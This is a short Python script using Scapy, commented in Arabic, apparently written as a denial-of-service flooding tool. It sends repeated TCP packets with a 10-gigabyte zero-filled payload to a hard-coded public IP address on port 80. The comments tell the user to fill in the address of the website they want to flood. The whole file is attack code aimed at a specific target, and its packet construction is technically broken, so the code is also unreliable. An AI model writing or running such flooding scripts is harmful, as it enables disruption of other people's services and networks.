from scapy.all import IP, TCP, send

def send_l4_requests(destination_ip, destination_port, num_requests, data_size):
    try:
        # حساب عدد البايتات لتحقيق حجم البيانات المطلوب بالجيجابايت
        data_bytes = data_size * 1024 * 1024 * 1024
        
        # إنشاء بيانات الطلب بحجم محدد
        data = b"0" * data_bytes
        
        for i in range(num_requests):
            packet = IP(dst=destination_ip) / TCP(dport=destination_port) / data
            send(packet)
            print("تم إرسال الطلب رقم", i+1, "بنجاح!")
        
    except Exception as e:
        print("حدث خطأ أثناء إرسال الطلب:", e)

# قم بتعيين عنوان IP الخاص بالموقع الذي ترغب في إرسال الطلبات إليه.
destination_ip = "104.22.48.228"

# قم بتعيين منفذ الوجهة الذي ترغب في إرسال الطلبات إليه.
destination_port = 80

# قم بتعيين عدد الطلبات التي ترغب في إرسالها.
num_requests = 100

# قم بتعيين حجم البيانات (بالجيجابايت) الذي ترغب في إرساله.
data_size = 10  # 10 جيجابايت

# قم بإنشاء دالة لإرسال الطلبات على مستوى Layer 4.
send_l4_requests(destination_ip, destination_port, num_requests, data_size)
